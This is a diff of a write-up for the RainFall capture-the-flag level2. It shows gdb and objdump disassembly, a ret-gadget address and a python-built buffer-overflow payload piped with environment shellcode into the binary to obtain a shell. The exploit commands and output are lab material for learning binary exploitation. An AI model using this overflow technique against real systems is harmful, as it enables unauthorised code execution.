@@ -15,8 +15,10 @@ level3 permissions.
 level2@RainFall:~$ ./level2 afasdf
 ajkshdfka
 ajkshdfka
+
 level2@RainFall:~$ gdb ./level2
 Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
+
 (gdb) disas main
 Dump of assembler code for function main:
    0x0804853f <+0>:	push   %ebp
@@ -26,6 +28,7 @@ Dump of assembler code for function main:
    0x0804854a <+11>:	leave
    0x0804854b <+12>:	ret
 End of assembler dump.
+
 (gdb) disas p
 Dump of assembler code for function p:
    0x080484d4 <+0>:	push   %ebp
@@ -90,6 +93,7 @@ level2@RainFall:~$ objdump -d level2 | grep -E7 "<main>"
  804854a:	c9                   	leave
  804854b:	c3                   	ret
  804854c:	90                   	nop
+
 level2@RainFall:~$ echo "804854b" > /tmp/ret_addr
 
 
@@ -152,9 +156,12 @@ in the instruction pointer (ip / eip).
 
 level2@RainFall:~$ cat /tmp/ret_addr
 804854b
+
 level2@RainFall:~$ cat /tmp/payload_addr
 0xbffffce0
+
 level2@RainFall:~$ python -c "print('a' * 80 + '\x4b\x85\x04\x08' + '\xe0\xfc\xff\xbf')" > /tmp/payload
+
 level2@RainFall:~$ cat /tmp/payload - | env -i payload=$(python /tmp/env_payload.py) ./level2
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaKaaaaaaaaaaaaK����
 $ pwd
